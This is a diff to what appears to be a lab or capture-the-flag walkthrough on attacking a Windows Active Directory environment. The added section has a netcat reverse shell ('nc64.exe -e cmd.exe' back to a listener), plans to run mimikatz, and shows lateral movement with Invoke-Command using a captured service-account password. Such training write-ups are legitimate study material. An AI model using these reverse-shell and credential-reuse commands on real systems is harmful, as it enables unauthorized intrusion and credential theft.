@@ -120,3 +120,18 @@ $Credential = New-Object -TypeName System.Management.Automation.PSCredential -Ar
 Invoke-Command -ComputerName MS01.INLANEFREIGHT.LOCAL -Scriptblock {type C:\Users\Administrator\Desktop\flag.txt} -Credential $Credential
 ```
 
+#### NEXT APROACH
+
+To continue, we need another aproach. Instead of using the webshell, lets gain a better shell to pivot and use mimikatz in the second machine.
+
+First we upload the [netcat 64 bits for windows](https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe) and create a reverse shell with our attack machine:
+
+`nc -lnvp 8888` and `nc64.exe -e cmd.exe LIP LPORT` on the windows host.
+
+And now we test the remote connection with the second windows machine using this one liner command and the svc\_sql credentials obtained.
+
+```
+Invoke-Command -ComputerName MS01.INLANEFREIGHT.LOCAL -Credential (New-Object PSCredential "svc_sql", (ConvertTo-SecureString "lucky7" -AsPlainText -Force)) -ScriptBlock { ipconfig }
+
+```
+
